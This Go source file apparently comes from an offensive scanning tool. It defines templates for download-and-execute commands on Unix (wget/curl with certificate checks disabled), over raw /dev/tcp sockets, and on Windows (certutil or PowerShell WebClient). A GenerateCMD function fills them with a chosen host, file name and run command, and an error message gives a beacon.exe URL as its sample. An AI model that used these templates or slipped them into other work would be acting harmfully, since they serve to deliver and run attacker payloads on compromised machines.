package utils

import (
	"fmt"
	"log"
	"math/rand"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"
)

var (
	UnixDownloader = "wget --no-check-certificate %s -O /tmp/%s || curl -k %s -o /tmp/%s && chmod +x /tmp/%s && /tmp/%s"
	TCPDownloader  = "exec 88<>/dev/tcp/%s && echo -e \"%s\\n\" >&88 && cat <&88 > /tmp/%s && chmod +x /tmp/%s && /tmp/%s"
	WinDownloader  = "certutil -urlcache -split -f %s C:/Windows/Temp/%s || powershell $cli=new-object System.Net.WebClient;[System.Net.ServicePointManager]::ServerCertificateValidationCallback += { $true };$cli.DownloadFile('%s','C:/Windows/Temp/%s') & C:/Windows/Temp/%s"
)

func IsContain(items []string, item string) bool {
	for _, eachItem := range items {
		if eachItem == item {
			return true
		}
	}
	return false
}

func RandString(n int) string {
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	rand.Seed(time.Now().UnixNano())
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func GenerateCMD(cmdtype string, loader common.Downloader) (cmd string) {
	switch cmdtype {
	case "unix":
		addr, filename, exec := loader.UnixHTTP.Addr, loader.UnixHTTP.FileName, loader.UnixHTTP.ExecCommand
		cmd = fmt.Sprintf(UnixDownloader, addr, filename, addr, filename, filename, exec)
	case "tcp":
		addr, filename, exec := loader.UnixTCP.Addr, loader.UnixTCP.FileName, loader.UnixTCP.ExecCommand
		tcpaddr := strings.Split(addr, "/")
		if len(tcpaddr) < 2 {
			log.Println("TCP下载地址错误，参考格式：192.168.0.1:8553/beacon.exe")
			return ""
		}
		_addr := strings.Replace(tcpaddr[0], ":", "/", -1)
		path := strings.Replace(addr, tcpaddr[0], "", 1)
		cmd = fmt.Sprintf(TCPDownloader, _addr, path, filename, filename, exec)
	case "win":
		addr, filename, exec := loader.WinHTTP.Addr, loader.WinHTTP.FileName, loader.WinHTTP.ExecCommand
		cmd = fmt.Sprintf(WinDownloader, addr, filename, addr, filename, exec)
	}
	return cmd
}
